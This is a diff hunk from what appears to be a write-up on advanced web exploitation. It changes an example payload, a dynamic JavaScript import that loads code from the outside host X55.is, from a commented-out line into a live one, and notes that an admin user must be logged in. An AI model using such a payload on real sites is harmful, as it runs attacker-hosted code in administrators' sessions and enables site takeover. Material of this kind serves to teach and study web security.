@@ -11,7 +11,7 @@ The following write-up highlights advanced web exploitation techniques focusing 
 
 Example:
 
-<!--import('//X55.is/wp')-->
+import('//X55.is/wp')
 Requirements:
 
 An admin user must be logged in with default write permissions.
